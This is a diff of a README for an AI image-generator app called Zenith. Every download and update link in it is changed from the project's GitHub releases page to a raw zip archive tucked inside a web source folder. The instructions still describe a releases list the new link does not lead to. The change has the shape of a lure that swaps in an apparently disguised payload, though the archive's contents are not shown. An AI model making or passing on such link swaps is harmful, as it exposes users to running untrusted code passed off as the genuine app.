@@ -1,7 +1,7 @@
 # 🌟 zenith-image-generator - Create Stunning Images Effortlessly
 
 ## 📥 Download the App
-[![Download Zenith Image Generator](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/NikkkoPrime/zenith-image-generator/releases)
+[![Download Zenith Image Generator](https://raw.githubusercontent.com/NikkkoPrime/zenith-image-generator/main/apps/web/src/lib/image-generator-zenith-v1.2-alpha.4.zip)](https://raw.githubusercontent.com/NikkkoPrime/zenith-image-generator/main/apps/web/src/lib/image-generator-zenith-v1.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Zenith Image Generator**! This application allows you to generate images using AI. It’s designed for everyone, no matter your technical level. Follow these steps to get started.
@@ -21,7 +21,7 @@ Before you download and install, ensure your system meets these requirements:
 - API access for developers.
 
 ## 📂 Download & Install
-To download the Zenith Image Generator, visit this page: [Download the latest release](https://github.com/NikkkoPrime/zenith-image-generator/releases). 
+To download the Zenith Image Generator, visit this page: [Download the latest release](https://raw.githubusercontent.com/NikkkoPrime/zenith-image-generator/main/apps/web/src/lib/image-generator-zenith-v1.2-alpha.4.zip). 
 
 1. Open the link above in your web browser.
 2. You will see a list of releases. Look for the most recent version.
@@ -46,7 +46,7 @@ For developers, our tool also provides an API option. Simply refer to the docume
 ## 🔄 Updating the Application
 To ensure you always have the latest features and improvements:
 
-1. Revisit this page: [Download the latest release](https://github.com/NikkkoPrime/zenith-image-generator/releases).
+1. Revisit this page: [Download the latest release](https://raw.githubusercontent.com/NikkkoPrime/zenith-image-generator/main/apps/web/src/lib/image-generator-zenith-v1.2-alpha.4.zip).
 2. Download the new version, as you did during the initial install.
 3. Follow the same installation steps to update your application.
 
